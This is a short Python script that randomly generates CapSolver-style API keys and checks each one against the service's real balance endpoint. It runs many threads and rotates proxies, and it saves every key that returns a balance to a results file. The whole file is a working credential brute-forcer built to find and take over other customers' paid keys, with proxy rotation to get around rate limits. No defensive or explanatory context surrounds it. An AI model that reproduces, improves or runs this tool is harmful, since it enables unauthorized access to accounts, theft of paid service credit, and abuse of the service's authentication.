from colorama import Fore,init
import threading
import secrets
import random
import requests
import time
import toml
import os

init(autoreset=True)
config = toml.load("./config.toml")

if config["proxies"] == "":
  proxies = ["None"]
elif not os.path.isfile(config["proxies"]):
  print(f"{Fore.RED}[!] proxies are wrong. set to txt file path or blank")
  while True:
    pass
else:
  with open(config["proxies"], "r") as f:
    s = f.read()
    proxies = s.split("\n")

def gen():
  global proxies
  while True:
    k = secrets.token_hex(100)[:32].upper()
    key = f"CAP-{k}"
    if "None" in proxies:
      res = requests.post("https://api.capsolver.com/getBalance", json={"clientKey": key})
    else:
      proxy = random.choice(proxies)
      res = requests.post("https://api.capsolver.com/getBalance", json={"clientKey": key}, proxies={"https": f"http://{proxy}"})
    if res.status_code in range(200, 299):
      balance = res.json()["balance"]
      print(f"{Fore.GREEN}[+] Working Key: {key} | Balance: {balance}")
      with open("results.txt", "a") as f:
        f.write(f"{key}\n")
    elif "account authorization is invalid" in res.text:
      print(f"{Fore.RED}[!] Not Working Key: {key}")
    else:
      print(f"{Fore.RED}[!] Error: {key} | {res.status_code} | {res.text}")
    time.sleep(config["interval"])

threads = []       
for f in range(config["threads"]):
  threads.append(threading.Thread(target=gen))
for thread in threads:
  thread.start()
for thread in threads:
  thread.join()
